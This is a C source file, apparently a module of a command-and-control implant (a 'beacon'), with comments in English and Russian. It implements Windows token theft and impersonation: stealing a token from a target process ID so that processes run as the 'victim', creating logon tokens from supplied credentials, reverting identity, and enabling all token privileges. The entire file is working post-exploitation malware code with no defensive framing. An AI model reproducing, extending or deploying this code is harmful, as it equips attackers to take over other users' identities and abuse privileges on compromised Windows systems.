// Token manipulation: steal_token, make_token, rev2self, getuid.
// advapi32 is already linked.

#include "../core/beacon.h"

static HANDLE g_stolen_token  = NULL; // impersonation token (thread context)
static HANDLE g_primary_token = NULL; // primary token (for CreateProcessWithTokenW)

// Возвращает primary-токен украденного пользователя или NULL.
// Используется в cmd_shell.c чтобы запускать процессы от имени другого пользователя.
HANDLE beacon_primary_token(void) { return g_primary_token; }

// ---- helpers ----------------------------------------------------------------

static void write_utf8_from_wide(const wchar_t* w, int wlen) {
    int un = WideCharToMultiByte(CP_UTF8, 0, w, wlen, NULL, 0, NULL, NULL);
    if (un <= 0) return;
    uint8_t* ub = (uint8_t*)bmalloc((size_t)un + 1);
    if (!ub) return;
    WideCharToMultiByte(CP_UTF8, 0, w, wlen, (LPSTR)ub, un, NULL, NULL);
    out_write(ub, (size_t)un);
    bfree(ub);
}

static uint32_t parse_decimal(const uint8_t* p, uint32_t len) {
    uint32_t v = 0;
    for (uint32_t i = 0; i < len; ++i) {
        if (p[i] < '0' || p[i] > '9') break;
        v = v * 10 + (p[i] - '0');
    }
    return v;
}

static void write_error(const char* msg) {
    out_write(msg, rt_strlen(msg));
}

// ---- cmd_token_steal --------------------------------------------------------

void cmd_token_steal(const BeaconTask* t) {
    if (!t->pay || t->pay_len == 0) {
        write_error("usage: steal_token <pid>\n"); return;
    }
    DWORD pid = (DWORD)parse_decimal(t->pay, t->pay_len);
    if (!pid) { write_error("invalid pid\n"); return; }

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) { write_error("OpenProcess failed\n"); return; }

    HANDLE hTok = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hTok)) {
        CloseHandle(hProc);
        write_error("OpenProcessToken failed\n"); return;
    }
    CloseHandle(hProc);

    // Impersonation token — для контекста текущего потока.
    HANDLE hDup = NULL;
    if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenImpersonation, &hDup)) {
        CloseHandle(hTok);
        write_error("DuplicateTokenEx failed\n"); return;
    }

    // Primary token — для CreateProcessWithTokenW (запуск процессов от имени жертвы).
    HANDLE hPrim = NULL;
    if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenPrimary, &hPrim)) {
        CloseHandle(hDup);
        CloseHandle(hTok);
        write_error("DuplicateTokenEx (primary) failed\n"); return;
    }
    CloseHandle(hTok);

    if (!ImpersonateLoggedOnUser(hDup)) {
        CloseHandle(hPrim);
        CloseHandle(hDup);
        write_error("ImpersonateLoggedOnUser failed\n"); return;
    }

    if (g_stolen_token)  CloseHandle(g_stolen_token);
    if (g_primary_token) CloseHandle(g_primary_token);
    g_stolen_token  = hDup;
    g_primary_token = hPrim;

    const char ok[] = "token stolen, now running as: ";
    out_write(ok, sizeof(ok) - 1);
    // print current user after impersonation
    wchar_t name[256]; DWORD nl = 256;
    if (GetUserNameW(name, &nl) && nl > 1)
        write_utf8_from_wide(name, (int)(nl - 1));
    out_write("\n", 1);
}

// ---- cmd_token_make ---------------------------------------------------------

void cmd_token_make(const BeaconTask* t) {
    // payload: "DOMAIN\\user password"  or  "user password"
    if (!t->pay || t->pay_len == 0) {
        write_error("usage: make_token DOMAIN\\user password\n"); return;
    }

    // Find space separating credentials from password.
    uint32_t sp = 0;
    while (sp < t->pay_len && t->pay[sp] != ' ') ++sp;
    if (sp == t->pay_len) { write_error("missing password\n"); return; }

    // cred = first token, may contain backslash for domain
    uint32_t cred_len = sp;
    uint32_t pass_len = t->pay_len - sp - 1;
    const uint8_t* cred = t->pay;
    const uint8_t* pass = t->pay + sp + 1;

    // Find backslash in cred to split domain\user
    uint32_t bs = 0;
    while (bs < cred_len && cred[bs] != '\\') ++bs;

    wchar_t wdomain[128] = {0}, wuser[128] = {0}, wpass[256] = {0};

    if (bs < cred_len) {
        // domain\user
        MultiByteToWideChar(CP_UTF8, 0, (LPCCH)cred, (int)bs, wdomain, 128);
        MultiByteToWideChar(CP_UTF8, 0, (LPCCH)(cred + bs + 1),
                            (int)(cred_len - bs - 1), wuser, 128);
    } else {
        // local user — use "." as domain
        wdomain[0] = L'.'; wdomain[1] = 0;
        MultiByteToWideChar(CP_UTF8, 0, (LPCCH)cred, (int)cred_len, wuser, 128);
    }
    MultiByteToWideChar(CP_UTF8, 0, (LPCCH)pass, (int)pass_len, wpass, 256);

    HANDLE hTok = NULL;
    if (!LogonUserW(wuser, wdomain, wpass,
                    LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hTok)) {
        write_error("LogonUserW failed\n"); return;
    }
    if (!ImpersonateLoggedOnUser(hTok)) {
        CloseHandle(hTok);
        write_error("ImpersonateLoggedOnUser failed\n"); return;
    }
    // LogonUserW возвращает primary token напрямую — сохраняем в оба слота.
    if (g_stolen_token)  CloseHandle(g_stolen_token);
    if (g_primary_token) CloseHandle(g_primary_token);
    g_stolen_token  = hTok;
    // Дублируем, так как g_stolen_token и g_primary_token должны быть разными хендлами.
    HANDLE hPrimMake = NULL;
    DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL,
                     SecurityImpersonation, TokenPrimary, &hPrimMake);
    g_primary_token = hPrimMake; // может быть NULL если DuplicateTokenEx не удался

    const char ok[] = "token created, impersonating: ";
    out_write(ok, sizeof(ok) - 1);
    wchar_t name[256]; DWORD nl = 256;
    if (GetUserNameW(name, &nl) && nl > 1)
        write_utf8_from_wide(name, (int)(nl - 1));
    out_write("\n", 1);

    // Zero password from stack.
    rt_memset(wpass, 0, sizeof(wpass));
}

// ---- cmd_token_rev ----------------------------------------------------------

void cmd_token_rev(const BeaconTask* t) {
    (void)t;
    RevertToSelf();
    if (g_stolen_token)  { CloseHandle(g_stolen_token);  g_stolen_token  = NULL; }
    if (g_primary_token) { CloseHandle(g_primary_token); g_primary_token = NULL; }
    const char ok[] = "reverted to self\n";
    out_write(ok, sizeof(ok) - 1);
}

// ---- cmd_priv_all -----------------------------------------------------------
// Включает все привилегии, присутствующие в токене потока (импersonation)
// или процесса. Не добавляет привилегии — только снимает флаг "Disabled".

void cmd_priv_all(const BeaconTask* t) {
    (void)t;

    // Сначала пробуем токен потока (steal_token устанавливает его через
    // ImpersonateLoggedOnUser). TOKEN_ADJUST_PRIVILEGES нужен для изменения.
    HANDLE hTok = NULL;
    BOOL from_thread = OpenThreadToken(GetCurrentThread(),
                                       TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                                       FALSE, &hTok);
    if (!from_thread) {
        if (!OpenProcessToken(GetCurrentProcess(),
                              TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                              &hTok)) {
            write_error("priv_all: OpenToken failed\n"); return;
        }
    }

    // Узнаём размер буфера под TOKEN_PRIVILEGES.
    DWORD cb = 0;
    GetTokenInformation(hTok, TokenPrivileges, NULL, 0, &cb);
    if (!cb) { CloseHandle(hTok); write_error("priv_all: query size failed\n"); return; }

    TOKEN_PRIVILEGES* tp = (TOKEN_PRIVILEGES*)bmalloc((size_t)cb);
    if (!tp) { CloseHandle(hTok); write_error("priv_all: alloc failed\n"); return; }

    if (!GetTokenInformation(hTok, TokenPrivileges, tp, cb, &cb)) {
        bfree(tp); CloseHandle(hTok);
        write_error("priv_all: GetTokenInformation failed\n"); return;
    }

    // Снимаем Disabled-флаг у каждой привилегии.
    for (DWORD i = 0; i < tp->PrivilegeCount; ++i)
        tp->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL ok = AdjustTokenPrivileges(hTok, FALSE, tp, 0, NULL, NULL);
    DWORD err = GetLastError();   // ERROR_NOT_ALL_ASSIGNED = 1300 при частичном успехе

    bfree(tp);
    CloseHandle(hTok);

    if (ok && err == 0) {
        write_error("priv_all: all privileges enabled\n");
    } else if (ok && err == ERROR_NOT_ALL_ASSIGNED) {
        write_error("priv_all: partial — some privileges not assigned to token\n");
    } else {
        write_error("priv_all: AdjustTokenPrivileges failed\n");
    }
}

// ---- cmd_token_getuid -------------------------------------------------------

void cmd_token_getuid(const BeaconTask* t) {
    (void)t;
    wchar_t name[256]; DWORD nl = 256;
    if (!GetUserNameW(name, &nl)) {
        write_error("GetUserNameW failed\n"); return;
    }
    write_utf8_from_wide(name, (int)(nl - 1));
    out_write("\n", 1);
}
